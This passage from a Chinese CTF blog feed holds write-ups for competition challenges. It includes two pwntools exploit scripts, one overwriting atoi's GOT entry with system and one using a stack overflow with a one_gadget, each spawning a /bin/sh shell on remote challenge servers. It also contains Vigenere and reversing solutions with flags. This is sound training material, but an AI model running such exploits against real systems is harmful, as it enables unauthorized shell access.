class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/05 09:53:58</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./iterator'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65001</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List count:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    <span class="comment">#print(p.recvline())</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ow</span><span class="params">(listn,st,ed,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(listn))</span><br><span class="line">    p.recvuntil(<span class="string">'Star id:'</span>)</span><br><span class="line">    p.sendline(str(st))</span><br><span class="line">    p.recvuntil(<span class="string">'End id:'</span>)</span><br><span class="line">    p.sendline(str(ed))</span><br><span class="line">    p.recvuntil(<span class="string">'New number:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(li,it)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(li))</span><br><span class="line">    p.recvuntil(<span class="string">'Item id:'</span>)</span><br><span class="line">    p.sendline(str(it))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showall</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(li,it,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(li))</span><br><span class="line">    p.recvuntil(<span class="string">'Item id:'</span>)</span><br><span class="line">    p.sendline(str(it))</span><br><span class="line">    p.recvuntil(<span class="string">'New number:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,<span class="string">'4'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0</span>,<span class="string">'2'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'3'</span>)</span><br><span class="line">showall()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">'111111'</span>)</span><br><span class="line">ow(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,str(<span class="number">1</span>))</span><br><span class="line">ow(<span class="number">0</span>,<span class="number">4</span>,<span class="number">4</span>,str(e.got[<span class="string">'atoi'</span>]))</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Number:'</span>)</span><br><span class="line">addr=int(p.recvline())</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">x=finder(<span class="string">'atoi'</span>,addr)</span><br><span class="line">debug()</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,str(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次吃到东软的瓜，虽然是大连东软的(老NSUer气抖冷)……</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTB-cosy_casino-pwn-challenge-wp</title>
    <link href="lexsd6.github.io/2021/12/03/cosy-casino-pwn-challenge-wp/"/>
    <id>lexsd6.github.io/2021/12/03/cosy-casino-pwn-challenge-wp/</id>
    <published>2021-12-03T06:45:50.000Z</published>
    <updated>2021-12-07T05:42:18.847Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="634453b67a2dc9922f2f9067eb2e9faafb242fe779c69d53bfd6369318030d94"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</title>
    <link href="lexsd6.github.io/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/"/>
    <id>lexsd6.github.io/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/</id>
    <published>2021-11-27T02:08:01.695Z</published>
    <updated>2021-12-01T09:10:35.889Z</updated>
    
    <content type="html"><![CDATA[<p>周末抽空看下了，感觉难度差异太大，涝的涝死旱的旱死，太菜了.( ┬o┬)…<a id="more"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h3><p>在<a href="https://www.boxentriq.com/code-breaking/vigenere-cipher" target="_blank" rel="noopener">https://www.boxentriq.com/code-breaking/vigenere-cipher</a> 网站爆破得到为key:asterism</p><p><img src="image-20211127100844149.png" alt="image-20211127100844149"></p><p>解密得到falg。</p><p><img src="image-20211127162758654.png" alt="image-20211127162758654"></p><p>flag为：<code>flag{53d613fc-6c5c-4dd6-b3ce-8bc867c6f648}</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="supercall"><a href="#supercall" class="headerlink" title="supercall"></a>supercall</h3><p>简单栈溢出，利用<a href="https://github.com/lexsd6/LibcSearcher_plus" target="_blank" rel="noopener">LibcSearcher</a>通过题目泄露出的<code>_IO_2_1_stdin_</code>的真实地址找到 libc 基地址，用one_gatget  来get shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/27 13:39:07</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./supercall'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'123.57.207.81'</span>,<span class="number">16985</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000026796 : pop rdi ; ret</span></span><br><span class="line">stack_addr=int(p.recvuntil(<span class="string">','</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">stdin_addr=int(p.recv(),<span class="number">16</span>)</span><br><span class="line">log.info(hex(stack_addr))</span><br><span class="line">log.info(hex(stdin_addr))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'_IO_2_1_stdin_'</span>,stdin_addr,num=<span class="number">9</span>)</span><br><span class="line"><span class="comment">#[-] 9: local-46e93283ff53133360e02a73ae5b5ba375410855 (source from:/mnt/d/filewsl/supercall/libc-2.27.so)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'2'</span>*<span class="number">8</span>+<span class="string">'3'</span>*<span class="number">7</span>)</span><br><span class="line">p.sendline(<span class="string">'\x00'</span>*<span class="number">0x10</span>+<span class="string">'x'</span>*<span class="number">8</span>+p64(x.ogg(num=<span class="number">0</span>)))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[-] 0: 0x4f3d5  execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>再在远程<code>cat flag</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[+] you choose gadget: 0x4f3d5</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">supercall</span><br><span class="line">$ cat f*</span><br><span class="line">flag&#123;2f3f3632-6484-4c00-82f3-a63e0d4340d9&#125;$</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p>发现题目有UPX壳，脱壳后，用ida打开审阅发现一疑似加密flag函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40186F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">256</span>]; <span class="comment">// [esp+18h] [ebp-910h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst[<span class="number">2048</span>]; <span class="comment">// [esp+118h] [ebp-810h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+918h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+91Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_4021AD(<span class="number">22</span>, <span class="number">18</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v1[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  sub_4017D2(v1, i);#fun2</span><br><span class="line">  <span class="built_in">memset</span>(Dst, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  sub_4015F7(v1, Dst, i); #fun1</span><br><span class="line">  sub_4021AD(<span class="number">22</span>, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; Dst[j]; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Dst[j] != a7g5d5bayTmdlwl[j] )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"不对哦~下次再来吧~"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(asc_405016);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进fun2发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4017D2</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      result = *(<span class="keyword">unsigned</span> __int8 *)(j + a1);</span><br><span class="line">      <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a2 % i )</span><br><span class="line">        *(_BYTE *)(j + a1) ^= (_BYTE)i + (_BYTE)j;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(j + a1) ^= (<span class="keyword">unsigned</span> __int8)(j % i) + (_BYTE)j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是对我们的输入字符串，每一个字符按位置进行与操作。</p><p>fun1是字符串的base64加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v16 &lt; a3 )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = v13;</span><br><span class="line">  v14 = v13 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v3) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + a1) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v11 = <span class="number">16</span> * *(_BYTE *)(v16 + a1) &amp; <span class="number">0x30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 + <span class="number">1</span> &gt;= a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v14;</span><br><span class="line">    v5 = v14 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v4) = Str[v11];</span><br><span class="line">    *(_BYTE *)(v5 + a2) = <span class="string">'='</span>;</span><br><span class="line">    v6 = v5 + <span class="number">1</span>;</span><br><span class="line">    v13 = v5 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v6 + a2) = <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v14;</span><br><span class="line">  v15 = v14 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v7) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + <span class="number">1</span> + a1) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span> | v11];</span><br><span class="line">  v12 = <span class="number">4</span> * *(_BYTE *)(v16 + <span class="number">1</span> + a1) &amp; <span class="number">0x3C</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 + <span class="number">2</span> &gt;= a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v15) = Str[v12];</span><br><span class="line">    v8 = v15 + <span class="number">1</span>;</span><br><span class="line">    v13 = v15 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v8 + a2) = <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a2 + v15) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + <span class="number">2</span> + a1) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span> | v12];</span><br><span class="line">  v9 = v15 + <span class="number">1</span>;</span><br><span class="line">  v13 = v15 + <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v9) = Str[*(_BYTE *)(v16 + <span class="number">2</span> + a1) &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v16 += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但在调试时，发现在fun1之前，有个函数将全局变量str值改动了</p><p>这个函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_401536</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// ST13_1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strlen</span>(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v2 / <span class="number">2</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; v2 - i - <span class="number">1</span> &gt; j; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] &gt; Str[j + <span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = Str[j];</span><br><span class="line">        Str[j] = Str[j + <span class="number">1</span>];</span><br><span class="line">        Str[j + <span class="number">1</span>] = v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  dword_406060 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是写脚本还愿str：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">base_flag=[]</span><br><span class="line"><span class="comment">#x='7G5d5bAy+TMdLWlu5CdkMTlcJnwkNUgb2AQL3CcmPpVf6DAp72scOSlb'</span></span><br><span class="line">x=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">v2 = len(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">for ( i = 0; v2 / 2 &gt; i; ++i )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    for ( j = 0; v2 - i - 1 &gt; j; ++j )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      if ( Str[j] &gt; Str[j + 1] )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v0 = Str[j];</span></span><br><span class="line"><span class="string">        Str[j] = Str[j + 1];</span></span><br><span class="line"><span class="string">        Str[j + 1] = v0;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    base_flag.append(ord(i))</span><br><span class="line">print(base_flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(v2//<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(v2-i<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> base_flag[j]&gt;base_flag[j+<span class="number">1</span>]:</span><br><span class="line">            v0=base_flag[j]</span><br><span class="line">            base_flag[j]=base_flag[j+<span class="number">1</span>]</span><br><span class="line">            base_flag[j+<span class="number">1</span>]=v0</span><br></pre></td></tr></table></figure><p>得到真正的str：<code>ABCDEFGHIJKLMNOPQRST0123456789+/UVWXYZabcdefghijklmnopqrstuvwxyz</code></p><p>在对fun1函数和fun2函数逆向换源，得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">table = <span class="string">'ABCDEFGHIJKLMNOPQRST0123456789+/UVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">table2 = <span 